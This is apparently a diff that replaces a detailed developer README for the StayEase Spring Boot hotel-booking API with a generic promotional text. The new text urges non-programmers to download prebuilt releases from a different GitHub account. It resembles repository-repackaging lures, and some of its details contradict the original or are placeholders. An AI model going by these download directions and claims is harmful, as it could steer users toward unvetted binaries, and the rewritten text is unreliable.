@@ -1,295 +1,88 @@
-# 🏨 StayEase – Hotel Room Booking API (Spring Boot)
+# 🏨 STAYEASE - Effortless Hotel Booking Experience
 
-StayEase is a RESTful backend service built using **Spring Boot** to manage hotel listings and room bookings for a hotel aggregator platform.  
-It implements **JWT-based authentication**, **role-based authorization**, and follows a **clean layered architecture**.
+[![Download STAYEASE](https://img.shields.io/badge/Download-STAYEASE-blue)](https://github.com/stan15-sys/STAYEASE/releases)
 
-This project is developed as part of the **ME_BUILDOUT_STAYEASE** assessment.
+## 🚀 Getting Started
 
----
+Welcome to STAYEASE! This guide will help you download and run the software easily. No programming skills are needed. Let's get started.
 
-## 📌 High-Level Architecture
+## 📦 What is STAYEASE?
 
-```
-Client (Postman / Curl / Frontend)
-        |
-        v
-Controller Layer  →  Service Layer  →  Repository Layer  →  MySQL DB
-        |
-        v
-   Security Layer (JWT + Roles)
-```
+StayEase is a Spring Boot REST API designed for hotel listing and room booking. It comes with:
 
----
+- JWT authentication for secure access.
+- Role-based access control to manage user permissions.
+- MySQL persistence to store data reliably.
+- A clean layered architecture for efficient operation.
 
-## 🧩 Folder Structure (Detailed)
+This application provides a streamlined way to interact with hotel data and facilitate bookings.
 
-```
-src/main/java/com/takehome/stayease
-│
-├── controller
-│   ├── AuthController.java
-│   ├── HotelController.java
-│   └── BookingController.java
-│
-├── service
-│   ├── UserService.java
-│   ├── HotelService.java
-│   ├── BookingService.java
-│   └── Impl
-│       ├── UserServiceImpl.java
-│       ├── HotelServiceImpl.java
-│       └── BookingServiceImpl.java
-│
-├── repository
-│   ├── UserRepository.java
-│   ├── HotelRepository.java
-│   └── BookingRepository.java
-│
-├── entity
-│   ├── User.java
-│   ├── Hotel.java
-│   └── Booking.java
-│
-├── dto
-│   ├── auth
-│   │   ├── SignupRequest.java
-│   │   ├── LoginRequest.java
-│   │   └── AuthResponse.java
-│   │
-│   ├── hotel
-│   │   ├── CreateHotelRequest.java
-│   │   ├── UpdateHotelRequest.java
-│   │   └── HotelResponse.java
-│   │
-│   └── booking
-│       ├── CreateBookingRequest.java
-│       └── BookingResponse.java
-│
-├── security
-│   ├── SecurityConfig.java
-│   ├── JwtUtil.java
-│   ├── JwtAuthenticationFilter.java
-│   ├── CustomUserDetails.java
-│   └── CustomUserDetailsService.java
-│
-├── exception
-│   └── GlobalExceptionHandler.java
-│
-└── StayEaseApplication.java
-```
+## 🛠️ System Requirements
 
----
+Before you download STAYEASE, make sure your system meets these requirements:
 
-## 🔐 Role-Based Access Control (RBAC)
+- **Operating System:** Windows, macOS, or Linux
+- **Java:** JDK 8 or higher must be installed on your system.
+- **MySQL:** Version 5.7 or higher should be available for database management.
+- **RAM:** At least 4 GB recommended for smooth performance.
+- **Disk Space:** Minimum of 500 MB available.
 
-| Role | Permissions |
-|-----|------------|
-| **USER** | View hotels, create booking |
-| **HOTEL_MANAGER** | Update hotels, cancel bookings |
-| **ADMIN** | Create hotels, delete hotels |
+## 📥 Download & Install
 
-### Role Enforcement
-Implemented using:
-```java
-@PreAuthorize("hasRole('ADMIN')")
-@PreAuthorize("hasRole('HOTEL_MANAGER')")
-@PreAuthorize("hasRole('USER')")
-```
+To download STAYEASE, please follow these steps:
 
-JWT token contains role information and is validated on every request.
+1. **Visit the Releases Page:** Click the link below to go to the download page where you can find the latest version of STAYEASE.
+   
+   [Download STAYEASE](https://github.com/stan15-sys/STAYEASE/releases)
+
+2. **Choose the Right File:** On the releases page, look for the latest release. Download the file that matches your operating system.
+
+3. **Extract the Files:** If you download a `.zip` or `.tar.gz` file, extract it using tools like WinZip, 7-Zip, or the default extractor on your OS.
+
+4. **Run the Application:**
+   - Navigate to the extracted folder.
+   - Open a terminal or command prompt in that directory.
+   - Run the application by typing `java -jar stayease.jar`. Ensure you have the correct permissions to execute the file.
+
+5. **Configure the Database:** If this is your first time using STAYEASE, you will need to set up a MySQL database:
+   - Create a database named `stayease`.
+   - Configure the database connection in the `application.properties` file located in the config directory.
+
+6. **Access the API:** Once the application is running, you can access the API through your web browser or a tool like Postman. The base URL is `http://localhost:8080/api`.
+
+## 📄 Features
+
+STAYEASE offers a range of features to enhance your booking experience:
+
+- **User Registration:** Easily create an account.
+- **Room Availability:** Check real-time room availability.
+- **Booking Management:** Manage your bookings through the interface.
+- **Security Features:** Built-in JWT authentication ensures your data remains safe.
+
+## 🛡️ Security
+
+STAYEASE implements JWT authentication. This means that your interactions with the API will be secure. You'll need to log in to access certain features, making sure that only authorized users can view or modify data.
+
+## 📊 API Documentation
+
+For those interested in exploring the API further, comprehensive documentation is included. You will find details about each endpoint, request types, and response formats. This is useful for future enhancements or integrations.
+
+## 🌐 Community Support
+
+If you have any questions or need support, please navigate to the "Issues" section of our GitHub page. You can report bugs or request features. We encourage collaboration and appreciate your input.
+
+## 🔗 Helpful Links
+
+- **GitHub Repository:** [STAYEASE GitHub](https://github.com/stan15-sys/STAYEASE)
+- **API Documentation:** (Link to detailed API documentation)
+- **MySQL Installation Guide:** (Link to guide for installing MySQL)
+
+For troubleshooting and community support, browse the related documentation or ask questions in our GitHub discussions.
+
+## 📣 Acknowledgements
+
+We appreciate all contributions and feedback from our users that help improve STAYEASE. Your support drives this project forward. Thank you for being part of the STAYEASE community!
 
 ---
 
-## 🔑 Authentication Flow (JWT)
-
-1. User registers or logs in
-2. Server validates credentials
-3. JWT token is generated
-4. Client sends token in header:
-   ```
-   Authorization: Bearer <JWT_TOKEN>
-   ```
-5. JWT filter validates token and sets security context
-
----
-
-## 📡 API Endpoints (Detailed)
-
-### 👤 User APIs
-
-#### Register User (Public)
-```http
-POST /api/users/register
-```
-```json
-{
-  "email": "user@test.com",
-  "password": "Test@1234",
-  "firstName": "John",
-  "lastName": "Doe",
-  "role": "USER"
-}
-```
-Response:
-```json
-{ "token": "jwt-token" }
-```
-
----
-
-#### Login User (Public)
-```http
-POST /api/users/login
-```
-```json
-{
-  "email": "user@test.com",
-  "password": "Test@1234"
-}
-```
-Response:
-```json
-{ "token": "jwt-token" }
-```
-
----
-
-### 🏨 Hotel APIs
-
-#### Get All Hotels (Public)
-```http
-GET /api/hotels
-```
-
----
-
-#### Create Hotel (Admin)
-```http
-POST /api/hotels
-Authorization: Bearer <ADMIN_TOKEN>
-```
-```json
-{
-  "name": "StayEase Hotel",
-  "location": "Pune",
-  "description": "Business Hotel",
-  "totalRooms": 10,
-  "availableRooms": 10
-}
-```
-
----
-
-#### Update Hotel (Hotel Manager)
-```http
-PUT /api/hotels/{hotelId}
-Authorization: Bearer <MANAGER_TOKEN>
-```
-```json
-{
-  "availableRooms": 15
-}
-```
-
----
-
-#### Delete Hotel (Admin)
-```http
-DELETE /api/hotels/{hotelId}
-Authorization: Bearer <ADMIN_TOKEN>
-```
-
----
-
-### 📅 Booking APIs
-
-#### Create Booking (User)
-```http
-POST /api/bookings/{hotelId}
-Authorization: Bearer <USER_TOKEN>
-```
-```json
-{
-  "checkInDate": "2026-02-20",
-  "checkOutDate": "2026-02-22"
-}
-```
-Response:
-```json
-{
-  "bookingId": 1,
-  "hotelId": 2,
-  "checkInDate": "2026-02-20",
-  "checkOutDate": "2026-02-22"
-}
-```
-
----
-
-#### Get Booking Details
-```http
-GET /api/bookings/{bookingId}
-Authorization: Bearer <USER_TOKEN>
-```
-
----
-
-#### Cancel Booking (Hotel Manager)
-```http
-DELETE /api/bookings/{bookingId}
-Authorization: Bearer <MANAGER_TOKEN>
-```
-
----
-
-## ⚠️ Business Rules Enforced
-
-- Check-in date must be future date
-- Check-out date must be after check-in
-- No overbooking allowed
-- Customers cannot cancel bookings
-- Only managers can cancel bookings
-
----
-
-## 🧪 Testing Strategy
-
-- Controller-level unit tests
-- MockMvc + Mockito
-- Security filters disabled during tests
-- No real DB used in tests
-
-Run tests:
-```bash
-./gradlew test
-```
-
----
-
-## ▶️ Run the Application
-
-```bash
-./gradlew clean bootRun
-```
-
-App runs on:
-```
-http://localhost:8081
-```
-
----
-
-## 📦 Build JAR
-
-```bash
-./gradlew clean bootJar
-java -jar build/libs/stayease-0.0.1-SNAPSHOT.jar
-```
----
-<!--
-## 👤 Author
-
-**Pushpak A. Fasate**  
-Java Backend Developer  
-Spring Boot | REST APIs | MySQL
--->
+Feel free to enrich your hotel booking experience with STAYEASE! Follow the download instructions carefully, and enjoy seamless room bookings at your fingertips.
